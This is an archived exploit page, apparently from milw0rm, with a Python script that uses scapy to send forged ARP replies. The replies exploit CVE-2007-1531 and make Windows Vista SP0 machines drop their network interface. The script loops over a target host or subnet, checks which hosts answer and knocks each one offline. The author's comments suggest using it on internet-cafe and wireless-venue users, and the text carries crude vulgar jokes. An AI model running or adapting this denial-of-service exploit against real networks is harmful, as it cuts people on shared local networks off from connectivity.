<html><head><title>MS Windows Vista forged ARP packet Network Stack DoS Exploit</title></head><pre>#!/usr/bin/env python
#
# :: Kristian Hermansen ::
# Date: 20070514
# Reference: CVE-2007-1531
# Description: Microsoft Windows Vista (SP0) dumps interfaces when
# it receives this ARP packet.  This DoS is useful for an internet
# cafe, wireless venue, or legitimate local attack.  The victim will
# need to manually refresh their network interface.  OK, sure
# it's a dumb local attack, but why does Vista disable iface!?!??
# -&gt; Thanks to Newsham / Hoagland
# Vulnerable: Microsoft Windows Vista (SP0) [All Versions]
# Tested:
# * victim == Windows Vista Enterprise (SP0) [English]
# * attacker == Ubuntu Feisty (7.04)
# Usage: python fISTArp.py &lt;victim&gt;
# Depends: scapy.py
# [?] If you don't have scapy
# [+] wget http://hg.secdev.org/scapy/raw-file/tip/scapy.py

from sys import argv
from os import geteuid
from scapy import Ether,ARP,send,srp,conf
from time import sleep

conf.verb = 0

def head():
    print &quot;&quot;&quot;
                       __ ___ ____ _____  _               
                      / _|_ _/ ___|_   _|/ \   _ __ _ __  
                     | |_ | |\___ \ | | / _ \ | '__| '_ \ 
                     |  _|| | ___) || |/ ___ \| |  | |_) |
                     |_| |___|____/ |_/_/   \_\_|  | .__/ 
                                                   |_|    

    &quot;&quot;&quot;

def isroot():
    if geteuid() != 0:
        print &quot;TRY AGAIN AS ROOT SILLY...&quot;
        return False
    else:
        return True

def usage():
    print &quot;usage:&quot;, argv[0], &quot;&lt;victim(s)&gt;&quot;
    print &quot;examples:&quot;, argv[0], &quot;192.168.1.100&quot;
    print &quot;examples:&quot;, argv[0], &quot;192.168.1.0/24\n&quot;

def fisting():
    arp_fist = ARP(pdst=argv[1],op=2)
    print &quot;We are going to loop forever, CTRL-C to stop...\n&quot;
    while True:
        sleep(3)
        for a in arp_fist:
            arping = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=a.pdst)
            ans,unans = srp(arping,timeout=0.1)
            if len(ans) == 1:
                a.psrc=a.pdst
                print a.pdst, &quot;is ALIVE!&quot;
                print &quot;* Time to shut it down!&quot;
                send(a)
                ans2,unans2 = srp(arping,timeout=0.1)
                if len(unans2) == 1:
                    print &quot;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&quot;
                    print &quot;@@@&quot;, a.psrc, &quot;was rubber fisted!&quot;
                    print &quot;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&quot;
                    sleep(3)
                else:
                    print &quot;FAILED:&quot;, a.pdst, &quot;is still alive :-(&quot;
            else:
                print a.pdst, &quot;is already DEAD!&quot;
            print

head()
if isroot() != True:
    exit(1)
if len(argv) != 2:
    usage()
    exit(1)
else:
    fisting()

# u.b.u.n.t.u n.e.t.s.n.i.p.e.r t.h.c.t.e.st.

# milw0rm.com [2007-05-15]</pre></html>